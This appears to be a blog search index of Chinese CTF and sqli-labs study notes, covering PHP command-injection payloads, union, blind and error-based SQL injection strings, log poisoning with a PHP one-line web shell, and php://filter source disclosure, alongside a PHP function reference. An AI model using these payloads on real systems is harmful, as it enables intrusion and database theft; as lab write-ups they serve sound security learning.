php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">/?c=data://text/plains,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plains</span>,&lt;<span class="hljs-string">?=</span>system(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>只是后面多了个.php<br><img src="/images/678.png"></p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>在url中输入</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">/?c=show<span class="hljs-constructor">_source(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">getcwd</span>()</span>))));<br></code></pre></td></tr></table></figure><p>得到flag<br>emmm~并不知道这是什么原理，后续跟进🥹</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>常见PHP语法</title>
    <link href="/2023/04/19/php/"/>
    <url>/2023/04/19/php/</url>
    
    <content type="html"><![CDATA[<h2 id="Include"><a href="#Include" class="headerlink" title="Include()"></a>Include()</h2><p>Include(‘‘)用于获取指定文件中存在的所有文本，代码和标记，并复制到使用该语句的  </p><p>文件中，在服务器执行之前，将php文件的内容插入到另一个php文件。</p><h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>语法：<br>Sub(string,start,Length)<br><strong>string:</strong>  必须。规定要返回其中一部分的字符串。</p><blockquote><h4 id="start-必须。规定在字符串的何处开始。"><a href="#start-必须。规定在字符串的何处开始。" class="headerlink" title="start: 必须。规定在字符串的何处开始。"></a>start: 必须。规定在字符串的何处开始。</h4><ul><li>正数 - 在字符串的指定位置开始</li><li>负数 - 在从字符串结尾开始的指定位置开始</li><li>0 - 在字符串中的第一个字符处开始</li></ul></blockquote><blockquote><h4 id="Length-可选。规定被返回字符串的长度。默认是直到字符串的结尾。"><a href="#Length-可选。规定被返回字符串的长度。默认是直到字符串的结尾。" class="headerlink" title="Length:可选。规定被返回字符串的长度。默认是直到字符串的结尾。"></a>Length:可选。规定被返回字符串的长度。默认是直到字符串的结尾。</h4><ul><li>   正数 - 从 start 参数所在的位置返回的长度</li><li>   负数 - 从字符串末端返回的长度</li></ul></blockquote><h2 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval()函数"></a>intval()函数</h2><p>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><blockquote><h4 id="int-intval-mixed-var-int-base-x3D-10"><a href="#int-intval-mixed-var-int-base-x3D-10" class="headerlink" title="int intval ( mixed $var [, int $base &#x3D; 10 ] )"></a>int intval ( mixed $var [, int $base &#x3D; 10 ] )</h4><ul><li>$var：要转换成 integer 的数量值。</li><li>$base：转化所使用的进制。</li></ul></blockquote><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p><h2 id="stype-alpha-函数"><a href="#stype-alpha-函数" class="headerlink" title="stype_alpha()函数"></a>stype_alpha()函数</h2><h4 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h4><p>ctype_alpha()函数是PHP中的字符类型(CType)函数，用于检查给定的字符串是否仅包含字母。</p><p>如果字符串只包含字母，返回bool <strong>true</strong> ，否则返回bool <strong>false</strong>。</p><h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><p>ctype_alpha(string):bool</p><h2 id="Is-numerice-函数"><a href="#Is-numerice-函数" class="headerlink" title="Is_numerice()函数:"></a>Is_numerice()函数:</h2><h4 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h4><p>函数用于检测变量是否为数字或数字字符串。<br>返回值：<br>如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。</p><h2 id="hexdec-函数"><a href="#hexdec-函数" class="headerlink" title="hexdec()函数:"></a>hexdec()函数:</h2><h4 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h4><p>Hexdec()函数把十六进制转换为十进制。</p><h4 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h4><p>Hexdec(hex_string)</p><p>Hex_string:必须，规定要转换的十六进制数</p><h2 id="preg-match-函数"><a href="#preg-match-函数" class="headerlink" title="preg_match()函数:"></a>preg_match()函数:</h2><p>Preg_match函数是进行<a href="https://blog.csdn.net/l1028386804/article/details/116778918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168186276216800222868537%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168186276216800222868537&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116778918-null-null.142%5Ev84%5Epc_search_v2,239%5Ev2%5Einsert_chatgpt&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2226.3001.4187">正则表达式</a>的匹配，成功返回1，否则返回0。</p><h4 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h4><p>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] )</p><blockquote><ul><li>$pattern: 要搜索的模式，字符串形式。</li><li>$subject: 输入字符串。</li><li>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</li><li>$flags：flags 可以被设置为以下标记值：<br> 1.PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</li><li>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</li></ul></blockquote><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p><h2 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace()函数"></a>str_replace()函数</h2><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><p>str_replace()函数替换字符串中的一些字符(区分大小写)。<br>该函数必须遵循下列规则：</p><blockquote><ul><li>如果搜索的字符串是一个数组，那么它将返回一个数组。</li><li>如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。</li><li>如果同时需要对某个数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余的元素将用空字符串进行替换。</li><li>如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。</li></ul></blockquote><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p><strong>str_replace(find,replace,string,count)</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>find</td><td>必需。规定要查找的值。</td></tr><tr><td>replace</td><td>必需。规定替换find中值的值。</td></tr><tr><td>string</td><td>必需。规定被搜索的字符串。</td></tr><tr><td>count</td><td>可选。一个变量，对替换数进行计数。</td></tr></tbody></table><p>返回值：返回带有替换值的字符串或数组。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctf_web</title>
    <link href="/2023/04/19/ctfweb/"/>
    <url>/2023/04/19/ctfweb/</url>
    
    <content type="html"><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>ctrl+u查看源代码即可找到base64编码形式的flag</p><h2 id="web2：sql注入"><a href="#web2：sql注入" class="headerlink" title="web2：sql注入"></a>web2：sql注入</h2><p>输入万能钥匙<br><img src="/images/fuck.png"><br>使用burp suite抓包<br>在burp suite里右键选择send to repeater<br>使用联合查询来查询回显位置</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/images/1.png"><br>接着就是爆库</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()#<br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> fron information_schema.columns where table_name=&#x27;flag&#x27;#<br></code></pre></td></tr></table></figure><p>爆值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span> from flag#<br></code></pre></td></tr></table></figure><p><img src="/images/2.png"><br>获得flag</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>页面中显示了部分源码，明显是引导我们利用文件包含漏洞进行操作，源码中的include()函数通过GET请求接受一个url参数，那接下来我们就给它传递一个url参数</p><p>这里我们使用burp suite抓包，利用php:&#x2F;&#x2F;input伪协议执行PHP代码，代码的内容为执行系统命令，查看当前目录下所有文件。</p><p><img src="/images/3.png"></p><p>很明显这个ctf_go_go_go文件就是存放flag的文件<br><img src="/images/4.png"><br>我们直接在url地址中拼接url参数，访问ctf_go_go文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=ctf_go_go_go<br></code></pre></td></tr></table></figure><p>成功获取flag!</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>进入题目，看到只有一句文件包含的提示。<br>这题使用input协议data协议都不可行，应该是被禁用了，所以从数据包入手<br><img src="/images/5.png"></p><p>我们发现该道题使用的是nginx服务器，那我们想到可不可以通过日志文件进行写码得到flag呢，所以我们访问日志看看</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=<span class="hljs-regexp">/var/</span>lg<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure><p><img src="/images/6.png"></p><blockquote><p>查看日志发现，每访问一次数据包中的User-Agent头会被写进日志中，那就尝试在UA头中写码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/7.png"></p><blockquote><p>在UA头后插入一句话木马后日志文件里并未显示说明木马已经被解析了，然后使用蚁剑连接。</p></blockquote><p><img src="/images/8.png"><br>连接后，flag就在网页根目录中<br><img src="/images/9.png"><br>获得flag！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>每周报告</title>
    <link href="/2023/04/15/my-blogneirong/"/>
    <url>/2023/04/15/my-blogneirong/</url>
    
    <content type="html"><![CDATA[<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>在通关sqllabs第9关与第10关时我们知道了时间盲注这一概念，<br>用时间盲注来判断注入点是否正确，使用sleep延迟函数。<br>if()函数条件判断函数<br>if(a,b,c)   if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;<br>sleep()函数网页延迟n秒后，输出结果<br>left（）函数             从左边数，取几个数<br>例如：left（abcdef，3）  取3位左边的数，就是abc  </p><ol><li>判断注入点：?id&#x3D;1 and sleep(10)–+ 如若页面加载则判断正确，否则尝试其他</li><li>爆库：?id&#x3D;1’ and if (length(database()) &#x3D; 8 ,sleep(4),1)–+ 如若延时则正确，?id&#x3D;1’ and If((substr(database(),1,1)&#x3D;’s’),sleep(5),1)–+ 挨个尝试找出八个字符库名security</li><li>爆表名：?id&#x3D;1’ and If((substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),1,1))&#x3D;‘u‘,sleep(4),1)–+ 等于users</li><li>爆字段：?id&#x3D;1’ and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() limit 0,1),1,1))&#x3D;105,sleep(4),1)–+</li><li>爆数据：?id&#x3D;1’ and If( (substr((select username from users limit 0,1),1,1))&#x3D;’a’,sleep(4),1)–+</li></ol><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在sqllabs 第13关中，可以测试出闭合点，但没有回显位，无法重复11，12题中的操作，所以这里我们尝试使用报错注入<br>1’)  and updatexml(1,concat(0x7e,(database()),0x7e),1) #<br><strong>虽然报错，但我们知道了库名为security</strong><br>1’)  and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’),0x7e),1) #<br><strong>再求得表名</strong><br>1’)  and updatexml(1,concat(0x7e,(select group_concat(username)from users),0x7e),1) #<br><strong>再求得字段</strong><br>可求得username 和 password</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>在24关中需要用到二次注入的原理，二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户 输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br><strong>第一步：插入恶意数据</strong><br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br><strong>第二步：引用恶意数据</strong><br>开发者默认存入数据库的数据都是安全的，在进行查询的时候，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><p>在25，26关都过滤了or和and 所以遇到有or或and的地方需要双写，<br>例：information-&gt;information&amp;&amp;password-&gt;passwoorrd<br>但26关也过滤掉了空格和注释符，这时可以采用报错法求得，空格可用“%a0” 或 “%0b” 替代空格，同时可以使用）来代替空格的划分作用，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”。<br><strong>管道符（Linux管道命令操作符）：</strong><br><img src="/./images/heiheihei.jpg" alt="Linux管道命令操作符"><br>Linux-&gt;ls-&gt;list-&gt;列表-&gt;显示指定工作目录下的内容<br>Linux-&gt;cat-&gt;用于连接文件并打印到标准输出设备上</p><h2 id="filter伪协议"><a href="#filter伪协议" class="headerlink" title="filter伪协议"></a>filter伪协议</h2><p>php:&#x2F;&#x2F;filter是php中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如base64编码处理，rot13处理等。官方解释为：php:&#x2F;&#x2F;filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。<br>Filter协议的一般语法为：php:&#x2F;&#x2F;filter&#x2F;过滤器|过滤器&#x2F;resource&#x3D;待过滤的数据流<br><strong>通过php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D; 利用LFI来查看源码</strong><br><a href="https://blog.csdn.net/qq_29419013/article/details/81201494">filter详细信息</a><br><a href="https://zhuanlan.zhihu.com/p/50445145">filter详细信息</a></p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>如果服务器传入数据库的数据是gbk等宽字节编码，可以在特殊字符之前增加一个十六进制字节，和转义符构成一个汉字字符，从而把转义符吃掉。<br><a href="https://blog.csdn.net/weixin_42040292/article/details/90719507">宽字节注入</a><br><strong>Referer: 服务器伪造</strong><br><strong>X-Forwarded-For:用于修改ip</strong></p><p><strong>常见的网站源码备份文件后缀:</strong></p><ul><li>tar.gz，zip，rar，tar<br><strong>常见的网站源码备份文件名：</strong><br>web，website，backup，back，www，wwwroot，temp<br><strong>常见的备份文件后缀名有：</strong></li><li>.git .svn .swp .~ .bak .bash_history</li></ul><h2 id="php序列化与反序列化"><a href="#php序列化与反序列化" class="headerlink" title="php序列化与反序列化"></a>php序列化与反序列化</h2><p> <strong>序列化</strong>是将变量转换为可保存或传输的字符串的过程；<strong>反序列化</strong>就是在适当的时候把这个字符串再转化成原来的变量使用。这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p> <strong>弱比较：</strong>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
